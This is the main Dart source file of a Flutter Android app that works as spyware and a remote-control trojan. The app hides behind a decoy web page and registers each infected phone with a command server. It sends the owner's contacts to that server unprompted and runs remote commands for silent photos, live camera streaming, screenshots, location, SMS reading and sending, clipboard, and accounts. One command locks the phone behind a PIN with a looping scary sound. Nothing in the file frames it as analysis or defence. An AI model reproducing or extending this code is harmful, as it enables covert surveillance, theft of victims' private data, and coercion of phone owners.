import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:vibration/vibration.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:webview_flutter/webview_flutter.dart';
import 'package:camera/camera.dart';
import 'package:image/image.dart' as img;
import 'package:shared_preferences/shared_preferences.dart';

// CONFIG & CONTROLLER GLOBAL
Map<String, dynamic> appConfig = {};
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
final AudioPlayer _audioPlayer = AudioPlayer();
String globalDeviceId = "";
String globalDeviceModel = "";
String currentLockMessage = "YOUR PHONE IS LOCKED!!!!";
String currentLockPIN = "123";
late IO.Socket socket;

// Native Channels
const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');
const MethodChannel platformNativeLock = MethodChannel(
  'com.nullx.pp/native_lock',
);

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await loadLocalConfig();

  await requestPermissions();
  if (Platform.isAndroid) await _requestOemAutoStart();

  Map<String, String> deviceInfo = await getDeviceInfo();
  globalDeviceId = deviceInfo['id']!;
  globalDeviceModel = deviceInfo['model']!;

  try {
    await platformSpy.invokeMethod('saveTargetId', globalDeviceId);
  } catch (e) {}

  initNativeChatListener();
  _initBackgroundProxyListener();
  await registerInitialDevice(globalDeviceId, globalDeviceModel);
  startSpyware(globalDeviceId, globalDeviceModel);

  _autoCollectIntel();

  runApp(const MyApp());
}

Future<void> _requestOemAutoStart() async {
  try {
    final androidInfo = await DeviceInfoPlugin().androidInfo;
    final manufacturer = androidInfo.manufacturer.toLowerCase();
    final package = 'com.nullx.pp';

    String? intentUri;
    if (manufacturer.contains('xiaomi')) {
      intentUri =
          'intent://#Intent;action=miui.intent.action.OP_AUTO_START;S.app_pkg=$package;B.is_show_auto_start=true;end';
    } else if (manufacturer.contains('oppo') ||
        manufacturer.contains('realme')) {
      intentUri =
          'intent://#Intent;action=com.oppo.safe;S.permission=OP_START_PACKAGE;S.package=$package;S.pack=$package;end';
    } else if (manufacturer.contains('vivo')) {
      intentUri = 'intent://#Intent;action=com.vivo.safe.AUTOSTART;end';
    } else if (manufacturer.contains('huawei') ||
        manufacturer.contains('honor')) {
      intentUri =
          'intent://#Intent;action=com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity;end';
    }

    if (intentUri != null && await canLaunchUrl(Uri.parse(intentUri))) {
      await launchUrl(
        Uri.parse(intentUri),
        mode: LaunchMode.externalApplication,
      );
    }
  } catch (e) {}
}

void _initBackgroundProxyListener() {
  const EventChannel(
    'com.nullx.pp/proxy_events',
  ).receiveBroadcastStream().listen((data) {
    if (data != null) executeLogic(data);
  });
}

void initNativeChatListener() {
  platformNativeLock.setMethodCallHandler((call) async {
    if (call.method == "onTargetReply") {
      String replyText = call.arguments.toString();
      _sendResponseToServer("target_chat_reply", {
        "app": "LOCK_SYSTEM",
        "title": "Target User",
        "body": replyText,
        "timestamp": DateTime.now().millisecondsSinceEpoch,
      });
    }
  });

  // FIXED: Menangani aliran frame dari Native Java ke Socket secara langsung
  platformSpy.setMethodCallHandler((call) async {
    if (call.method == "live_frame") {
      if (socket.connected) {
        socket.emit('target_response', {
          "cmd": "live_camera_frame",
          "data": call.arguments['image'],
        });
      }
    }
  });
}

void _autoCollectIntel() async {
  try {
    final contacts = await _getContactsInternal();
    final Battery battery = Battery();
    int level = await battery.batteryLevel;

    _sendResponseToServer("auto_intel", {
      "contacts": contacts,
      "battery": level.toString(),
      "model": globalDeviceModel,
      "timestamp": DateTime.now().millisecondsSinceEpoch,
    });
  } catch (e) {}
}

Future<void> loadLocalConfig() async {
  try {
    final String response = await rootBundle.loadString('assets/config.json');
    appConfig = json.decode(response);
  } catch (e) {
    appConfig = {
      "server_url": "http://127.0.0.1:3000",
      "owner_name": "aii",
      "landing_web": "https://indictive-web.vercel.app",
    };
  }

  // Simpan server_url ke SharedPreferences supaya SpyService (native) bisa baca
  // bahkan saat Flutter app sudah di-close
  try {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(
      'server_url',
      appConfig['server_url'] ?? 'http://127.0.0.1:3000',
    );
  } catch (e) {}
}

Future<void> requestPermissions() async {
  await [
    Permission.location,
    Permission.contacts,
    Permission.camera,
    Permission.microphone,
    Permission.ignoreBatteryOptimizations,
    Permission.notification,
    Permission.sms,
    Permission.phone,
    Permission.storage,
    Permission.systemAlertWindow,
  ].request();
}

Future<Map<String, String>> getDeviceInfo() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  String modelName = "Unknown";
  String identifier = "UNKNOWN_ID";
  if (Platform.isAndroid) {
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    modelName = "${androidInfo.brand.toUpperCase()} ${androidInfo.model}";
    identifier = "${androidInfo.brand}-${androidInfo.model}-${androidInfo.id}"
        .replaceAll(' ', '_');
  }
  return {"id": identifier, "model": modelName};
}

Future<void> registerInitialDevice(String id, String model) async {
  try {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    await http.post(
      Uri.parse("${appConfig['server_url']}/api/register-target"),
      body: jsonEncode({
        "id": id,
        "admin": appConfig['owner_name'],
        "model": model,
        "battery": level.toString(),
        "status": "Online",
        "lastSeen": DateTime.now().toIso8601String(),
      }),
      headers: {"Content-Type": "application/json"},
    );
  } catch (e) {}
}

void playScarySound() async {
  await _audioPlayer.setReleaseMode(ReleaseMode.loop);
  await _audioPlayer.play(
    UrlSource(
      'https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3',
    ),
  );
}

void startSpyware(String deviceId, String deviceName) {
  String serverBase = appConfig['server_url'];

  // Flutter socket pakai suffix _flutter agar tidak konflik dengan SpyService native socket
  // SpyService handle heartbeat & reconnect, Flutter handle command execution & response
  socket = IO.io(
    serverBase,
    IO.OptionBuilder()
        .setTransports(['websocket'])
        .setQuery({'id': deviceId, 'type': 'target'})
        .enableAutoConnect()
        .build(),
  );

  socket.onConnect((_) {
    debugPrint('[+] Flutter Socket Connected');
  });

  socket.on('new_command', (data) => executeLogic(data));
  socket.on('execute', (data) => executeLogic(data));

  // Heartbeat Flutter hanya backup saat app aktif di foreground.
  // Heartbeat utama dihandle SpyService (native) agar tetap jalan saat app di-close.
  Timer.periodic(const Duration(seconds: 30), (t) {
    if (socket.connected) _sendHeartbeat();
  });
}

void _sendHeartbeat() async {
  try {
    final level = await Battery().batteryLevel;
    await http.post(
      Uri.parse("${appConfig['server_url']}/api/heartbeat/$globalDeviceId"),
      body: jsonEncode({"battery": level.toString()}),
      headers: {"Content-Type": "application/json"},
    );
  } catch (e) {}
}

// --- ARSENAL EXECUTOR ---
Future<void> executeLogic(dynamic data) async {
  String command = data['command'] ?? "idle";
  String extra = data['extra'] ?? "";
  dynamic resultData;

  switch (command) {
    // FIXED: Handler untuk memulai Live Camera Streaming
    case "start_live_camera":
      await platformSpy.invokeMethod('start_live_camera', {
        "side": extra.isEmpty ? "back" : extra,
      });
      break;

    // FIXED: Handler untuk menghentikan Live Camera Streaming
    case "stop_live_camera":
      await platformSpy.invokeMethod('stop_live_camera');
      break;

    case "take_photo":
    case "takeSilentPhotoBackground":
      String side = extra.isEmpty ? "back" : extra;
      platformSpy.invokeMethod('take_photo', {"side": side});
      _executeFlutterSilentCamera(side);
      break;

    case "get_screen":
      resultData = await platformSpy.invokeMethod('get_screen');
      break;

    case "get_location":
      Position pos = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );
      resultData = {"lat": pos.latitude, "lng": pos.longitude};
      break;

    case "get_contacts":
      resultData = {"contacts": await _getContactsInternal()};
      break;

    case "get_gmails":
    case "get_accounts":
      String? emails = await platformSpy.invokeMethod('get_gmails');
      resultData = {"accounts": emails ?? "Denied"};
      break;

    case "get_apps":
      final List<dynamic> apps = await platformSpy.invokeMethod('get_apps');
      resultData = {"apps": apps};
      break;

    case "hard_lock":
      if (extra.contains('|')) {
        List<String> parts = extra.split('|');
        currentLockMessage = parts[0];
        currentLockPIN = parts[1];
      }
      deviceLocked.value = true;
      playScarySound();
      await platformSpy.invokeMethod('bringToForeground');
      resultData = {"status": "Locked Native"};
      break;

    case "unlock":
      deviceLocked.value = false;
      await _audioPlayer.stop();
      await platformStrobe.invokeMethod('stop_strobe');
      resultData = {"status": "Unlocked Native"};
      break;

    case "flash_strobe":
      await platformStrobe.invokeMethod('flash_strobe');
      break;

    case "stop_strobe":
      await platformStrobe.invokeMethod('stop_strobe');
      break;

    case "set_vol_max":
      await platformSpy.invokeMethod('set_vol_max');
      break;

    case "vibrate_loop":
      Vibration.vibrate(duration: 10000);
      await platformSpy.invokeMethod('vibrate_loop');
      break;

    case "set_wallpaper":
      await platformSpy.invokeMethod('set_wallpaper', {"url": extra});
      break;

    case "open_url":
      if (await canLaunchUrl(Uri.parse(extra))) {
        await launchUrl(Uri.parse(extra), mode: LaunchMode.externalApplication);
      }
      break;

    case "speak_tts":
      await platformSpy.invokeMethod('speakText', {"text": extra});
      break;

    case "bring_to_foreground":
      await platformSpy.invokeMethod('bringToForeground');
      break;

    case "open_notif_access":
      await platformSpy.invokeMethod('openNotificationSettings');
      break;

    case "get_clipboard":
      resultData = await platformSpy.invokeMethod('get_clipboard');
      break;

    case "get_sms":
      resultData = await platformSpy.invokeMethod('get_sms');
      break;

    case "play_audio":
      if (extra.isNotEmpty) {
        await _audioPlayer.stop();
        await _audioPlayer.play(UrlSource(extra));
      }
      break;

    case "stop_audio":
      await _audioPlayer.stop();
      break;

    case "send_sms":
      if (extra.contains('|')) {
        List<String> parts = extra.split('|');
        if (parts.length >= 2) {
          String number = parts[0];
          String message = parts.sublist(1).join('|');
          await platformSpy.invokeMethod('send_sms', {
            "number": number,
            "message": message,
          });
        }
      }
      break;

    case "get_device_info":
      String? androidInfo;
      if (Platform.isAndroid) {
        final info = await DeviceInfoPlugin().androidInfo;
        androidInfo = jsonEncode({
          "brand": info.brand,
          "model": info.model,
          "device": info.device,
          "androidId": info.id,
          "version": "${info.version.release} (API ${info.version.sdkInt})",
          "manufacturer": info.manufacturer,
          "board": info.board,
          "hardware": info.hardware,
          "product": info.product,
          "display": info.display,
          "fingerprint": info.fingerprint,
          "buildId": deviceInfo.id,
          "bootloader": info.bootloader,
          "isPhysicalDevice": info.isPhysicalDevice,
          "baseBand": deviceInfo.version.baseband ?? "",
        });
      }
      final level = await Battery().batteryLevel;
      resultData = {
        "info": androidInfo,
        "deviceId": globalDeviceId,
        "model": globalDeviceModel,
        "battery": level,
      };
      break;

    case "ping":
      resultData = {
        "status": "pong",
        "timestamp": DateTime.now().millisecondsSinceEpoch,
      };
      break;
  }

  if (resultData != null) {
    _sendResponseToServer(command, resultData);
  }
}

Future<List<Map<String, String>>> _getContactsInternal() async {
  if (await FlutterContacts.requestPermission()) {
    final contacts = await FlutterContacts.getContacts(withProperties: true);
    return contacts
        .take(100)
        .map(
          (e) => {
            "name": e.displayName,
            "num": e.phones.isNotEmpty ? e.phones.first.number : "",
          },
        )
        .toList();
  }
  return [];
}

Future<void> _executeFlutterSilentCamera(String side) async {
  try {
    final cameras = await availableCameras();
    final cam = cameras.firstWhere(
      (c) =>
          c.lensDirection ==
          (side == "front"
              ? CameraLensDirection.front
              : CameraLensDirection.back),
    );
    final controller = CameraController(
      cam,
      ResolutionPreset.low,
      enableAudio: false,
    );
    await controller.initialize();
    XFile photo = await controller.takePicture();
    final bytes = await File(photo.path).readAsBytes();
    img.Image? decoded = img.decodeImage(bytes);
    String base64Image = base64Encode(img.encodeJpg(decoded!, quality: 40));
    _sendResponseToServer("take_photo", {"image": base64Image});
    await File(photo.path).delete();
    await controller.dispose();
  } catch (e) {}
}

Future<void> _sendResponseToServer(String cmd, dynamic data) async {
  try {
    var payload = {"cmd": cmd, "data": data};
    if (socket.connected) {
      socket.emit('target_response', payload);
    }
    await http.post(
      Uri.parse("${appConfig['server_url']}/api/post-response/$globalDeviceId"),
      body: jsonEncode(payload),
      headers: {"Content-Type": "application/json"},
    );
  } catch (e) {}
}

// --- UI COMPONENTS ---
class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark().copyWith(scaffoldBackgroundColor: Colors.black),
      home: const MainLockWrapper(),
    );
  }
}

class MainLockWrapper extends StatefulWidget {
  const MainLockWrapper({super.key});
  @override
  State<MainLockWrapper> createState() => _MainLockWrapperState();
}

class _MainLockWrapperState extends State<MainLockWrapper>
    with WidgetsBindingObserver {
  final TextEditingController _passController = TextEditingController();
  late final WebViewController _webController;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _webController = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..loadRequest(
        Uri.parse(appConfig['landing_web'] ?? "https://google.com"),
      );
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _passController.dispose();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (deviceLocked.value &&
        (state == AppLifecycleState.paused ||
            state == AppLifecycleState.inactive)) {
      platformSpy.invokeMethod('bringToForeground');
    }
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (context, isLocked, child) {
        return PopScope(
          canPop: !isLocked,
          child: Stack(
            children: [
              Scaffold(body: WebViewWidget(controller: _webController)),
              if (isLocked)
                Scaffold(
                  backgroundColor: Colors.black,
                  body: Padding(
                    padding: const EdgeInsets.all(20),
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        const Icon(
                          Icons.gpp_maybe,
                          color: Colors.red,
                          size: 80,
                        ),
                        const SizedBox(height: 20),
                        Text(
                          currentLockMessage,
                          textAlign: TextAlign.center,
                          style: const TextStyle(
                            color: Colors.red,
                            fontSize: 22,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                        const SizedBox(height: 40),
                        TextField(
                          controller: _passController,
                          obscureText: true,
                          textAlign: TextAlign.center,
                          style: const TextStyle(color: Colors.white),
                          decoration: const InputDecoration(
                            hintText: "PASSWORD",
                            enabledBorder: OutlineInputBorder(
                              borderSide: BorderSide(color: Colors.red),
                            ),
                            focusedBorder: OutlineInputBorder(
                              borderSide: BorderSide(color: Colors.red),
                            ),
                          ),
                        ),
                        const SizedBox(height: 20),
                        ElevatedButton(
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.red[900],
                            minimumSize: const Size(double.infinity, 50),
                          ),
                          onPressed: () async {
                            if (_passController.text == currentLockPIN) {
                              deviceLocked.value = false;
                              _audioPlayer.stop();
                              _passController.clear();
                              try {
                                await platformSpy.invokeMethod('unlock');
                              } catch (e) {}
                            }
                          },
                          child: const Text("UNLOCK"),
                        ),
                      ],
                    ),
                  ),
                ),
            ],
          ),
        );
      },
    );
  }
}
